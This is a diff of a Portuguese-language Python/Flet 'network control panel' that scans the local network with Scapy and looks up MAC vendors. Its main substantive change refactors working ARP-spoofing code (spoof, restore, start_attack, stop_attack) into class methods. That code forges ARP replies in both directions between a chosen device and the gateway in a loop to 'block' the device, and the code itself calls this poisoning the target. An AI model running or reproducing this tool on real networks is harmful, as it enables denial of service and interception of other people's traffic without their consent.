@@ -9,7 +9,7 @@ import os
 import ipaddress
 import itertools
 import re
-import concurrent.futures  # <-- ADICIONADO
+import concurrent.futures   # <-- ADICIONADO
 
 
 # Dependências de rede
@@ -19,12 +19,12 @@ from scapy.all import ARP, Ether, srp, send, conf
 # =====================================================================
 # Configurações e cache global
 # =====================================================================
-conf.verb = 0  # Menos ruído do Scapy
+conf.verb = 0   # Menos ruído do Scapy
 VENDOR_CACHE_FILE = "mac_vendor_cache.json"
 IEEE_OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"
 
 CURRENT_IFACE = None
-CURRENT_SUBNET = None  # ipaddress.IPv4Network
+CURRENT_SUBNET = None   # ipaddress.IPv4Network
 NMAP_BIN = None
 VENDOR_CACHE = {}
 
@@ -80,23 +80,6 @@ def detect_active_interface_and_subnet():
             if iface_name:
                 break
         return iface_name, gw_ip, subnet
-    except Exception:
-        return None, None, None
-
-        iface = default_gateway_info[1]
-        gw_ip = default_gateway_info[0]
-
-        addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
-        for a in addrs:
-            ip = a.get("addr")
-            netmask = a.get("netmask")
-            if ip and netmask:
-                try:
-                    subnet = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
-                    return iface, gw_ip, subnet
-                except Exception:
-                    pass
-        return iface, gw_ip, None
     except Exception:
         return None, None, None
 
@@ -162,7 +145,7 @@ def update_vendor_cache_from_ieee() -> int:
             if "(hex)" in line:
                 parts = line.split("(hex)")
                 if len(parts) > 1:
-                    oui_mac = parts[0].strip().replace("-", ":").upper()  # AA:BB:CC
+                    oui_mac = parts[0].strip().replace("-", ":").upper()   # AA:BB:CC
                     company = parts[1].strip()
                     if oui_mac and company:
                         if VENDOR_CACHE.get(oui_mac) != company:
@@ -293,57 +276,6 @@ def scan_network(network: str):
         return []
 
 
-def spoof(target_ip, spoof_ip):
-    """Mantém a assinatura do seu código. Envia ARP Reply para envenenar o alvo."""
-    target_mac = get_mac(target_ip)
-    if target_mac:
-        try:
-            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-            send(packet, verbose=False, iface=CURRENT_IFACE)
-        except Exception:
-            pass
-
-
-def restore(target_ip, source_ip):
-    """Mantém a assinatura do seu código. Restaura o ARP com MACs reais."""
-    target_mac = get_mac(target_ip)
-    source_mac = get_mac(source_ip)
-    if target_mac and source_mac:
-        try:
-            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-            send(packet, count=4, verbose=False, iface=CURRENT_IFACE)
-        except Exception:
-            pass
-
-
-def start_attack(target_ip, gateway_ip, attacking_state):
-    """Mantém a assinatura/comportamento: loop em thread enviando spoof bilateral."""
-    if target_ip == gateway_ip:
-        return
-
-    def attack_loop():
-        # Pequena fase inicial para obter MACs e validar conectividade
-        _ = get_mac(target_ip)
-        _ = get_mac(gateway_ip)
-        while attacking_state.get(target_ip):
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            time.sleep(2)
-
-    attacking_state[target_ip] = True
-    thread = threading.Thread(target=attack_loop, daemon=True)
-    thread.start()
-
-
-def stop_attack(target_ip, gateway_ip, attacking_state):
-    """Mantém a assinatura: para loop e restaura ARP dos dois lados."""
-    if target_ip in attacking_state:
-        attacking_state[target_ip] = False
-        time.sleep(0.1)
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-
-
 def get_hostname(ip: str) -> str:
     try:
         return socket.gethostbyaddr(ip)[0]
@@ -361,7 +293,7 @@ class NetworkControlApp:
         self.page = page
         self.page.title = "Painel de Controle da Rede"
         self.page.theme_mode = ft.ThemeMode.DARK
-        self.page.bgcolor = "#111827"  # bg-gray-900
+        self.page.bgcolor = "#111827"   # bg-gray-900
         self.page.padding = ft.padding.all(0)
         self.page.fonts = {"Inter": "https://rsms.me/inter/font-files/Inter-Regular.otf?v=3.19"}
         self.page.theme = ft.Theme(font_family="Inter")
@@ -369,9 +301,9 @@ class NetworkControlApp:
         self.page.window_min_height = 720
 
         # Estado
-        self.attacking = {}              # ip -> bool
-        self.all_devices = []            # lista de dicts de dispositivos
-        self.device_index = {}           # ip -> dict (acesso/atualização rápida)
+        self.attacking = {}                     # ip -> bool
+        self.all_devices = []                  # lista de dicts de dispositivos
+        self.device_index = {}                # ip -> dict (acesso/atualização rápida)
         self.stop_scan_requested = False
         self.scanning = False
 
@@ -394,7 +326,7 @@ class NetworkControlApp:
 
         # Controles de UI
         self.search_field = ft.TextField(
-            hint_text="Buscar por IP, MAC, nome ou fabricante...",
+            hint_text="Buscar por IP, MAC, nome, ou fabricante...",
             prefix_icon=ft.Icons.SEARCH,
             border_color="#374151",
             focused_border_color="#3b82f6",
@@ -490,8 +422,8 @@ class NetworkControlApp:
                 ft.Container(self.scan_status, padding=ft.padding.only(left=16, right=16, bottom=8)),
                 self.devices_list_view,
             ]),
-            bgcolor="#1f2937",  # bg-gray-800
-            border=ft.border.all(1, "#374151"),  # border-gray-700
+            bgcolor="#1f2937",   # bg-gray-800
+            border=ft.border.all(1, "#374151"),   # border-gray-700
             border_radius=12,
             margin=ft.margin.all(20),
             shadow=ft.BoxShadow(
@@ -524,7 +456,7 @@ class NetworkControlApp:
             icon_name = ft.Icons.NO_CELL_OUTLINED
             icon_color = "#f87171"
             icon_bg = "#991b1b"
-        else:  # Conectado
+        else:   # Conectado
             icon_name = ft.Icons.DEVICE_UNKNOWN
             icon_color = "#4ade80"
             icon_bg = "#166534"
@@ -743,7 +675,7 @@ class NetworkControlApp:
             self.scan_toggle_button.content.controls[1].value = "Parar Scan"
             self.scan_toggle_button.style.bgcolor = "#dc2626"
             self.scan_status.value = "Escaneando..."
-            self.scan_progress.value = None  # indeterminado durante preparação
+            self.scan_progress.value = None   # indeterminado durante preparação
             self.page.update()
 
             await self.run_scan_task()
@@ -801,9 +733,9 @@ class NetworkControlApp:
             processed = 0
 
             # Configurações de desempenho
-            CHUNK_SIZE = 32          # tamanho do lote ARP
-            ARP_TIMEOUT = 1.5        # timeout por lote (definido no _arp_chunk_scan)
-            USE_MULTITHREAD = True   # <-- altere para False se quiser a versão sequencial original
+            CHUNK_SIZE = 32               # tamanho do lote ARP
+            ARP_TIMEOUT = 1.5            # timeout por lote (definido no _arp_chunk_scan)
+            USE_MULTITHREAD = True    # <-- altere para False se quiser a versão sequencial original
 
             self.scan_progress.value = 0
             self.page.update()
@@ -928,10 +860,10 @@ class NetworkControlApp:
         is_currently_attacking = self.attacking.get(ip_to_toggle, False)
 
         if is_currently_attacking:
-            stop_attack(ip_to_toggle, self.gateway_ip, self.attacking)
+            self.stop_attack(ip_to_toggle, self.gateway_ip)
             device['status'] = 'Conectado'
         else:
-            start_attack(ip_to_toggle, self.gateway_ip, self.attacking)
+            self.start_attack(ip_to_toggle, self.gateway_ip)
             device['status'] = 'Bloqueado'
 
         # Reflete imediatamente na lista filtrada
@@ -970,13 +902,79 @@ class NetworkControlApp:
         fut.add_done_callback(_done)
 
 
+    # =====================================================================
+    # Funções de ataque e restauração (agora como métodos da classe)
+    # =====================================================================
+    def spoof(self, target_ip, spoof_ip, target_mac):
+        """Envia ARP Reply para envenenar o alvo, usando um MAC conhecido."""
+        if target_mac:
+            try:
+                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+                send(packet, verbose=False, iface=CURRENT_IFACE)
+            except Exception:
+                pass
+
+    def restore(self, target_ip, source_ip, target_mac, source_mac):
+        """
+        Restaura o ARP usando os MACs corretos do cache local.
+        Não chama get_mac.
+        """
+        if target_mac and source_mac:
+            try:
+                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+                send(packet, count=6, verbose=False, iface=CURRENT_IFACE)
+            except Exception:
+                pass
+
+    def start_attack(self, target_ip, gateway_ip):
+        """
+        Loop em thread enviando spoof bilateral. Usa os MACs do cache.
+        """
+        target_device = self.device_index.get(target_ip)
+        gateway_device = self.device_index.get(gateway_ip)
+
+        if not target_device or not gateway_device or not target_device.get('mac') or not gateway_device.get('mac'):
+            # Não inicia o ataque se os MACs não estiverem no cache
+            return
+
+        target_mac = target_device['mac']
+        gateway_mac = gateway_device['mac']
+
+        def attack_loop():
+            while self.attacking.get(target_ip):
+                self.spoof(target_ip, gateway_ip, target_mac)
+                self.spoof(gateway_ip, target_ip, gateway_mac)
+                time.sleep(2)
+
+        self.attacking[target_ip] = True
+        thread = threading.Thread(target=attack_loop, daemon=True)
+        thread.start()
+
+
+    def stop_attack(self, target_ip, gateway_ip):
+        """
+        Para o loop de ataque e restaura o ARP usando os MACs do cache.
+        """
+        target_device = self.device_index.get(target_ip)
+        gateway_device = self.device_index.get(gateway_ip)
+
+        if target_ip in self.attacking and target_device and gateway_device:
+            self.attacking[target_ip] = False
+            time.sleep(0.1)  # Dá tempo para a thread de ataque morrer
+
+            target_mac = target_device.get('mac')
+            gateway_mac = gateway_device.get('mac')
+            
+            # Chama o método restore, passando os MACs corretos do cache
+            self.restore(target_ip, gateway_ip, target_mac, gateway_mac)
+            self.restore(gateway_ip, target_ip, gateway_mac, target_mac)
 
 # =====================================================================
 # Bootstrap Flet
 # =====================================================================
 
 def main(page: ft.Page):
-    NetworkControlApp(page)
+    app = NetworkControlApp(page)
 
 if __name__ == "__main__":
     ft.app(target=main)
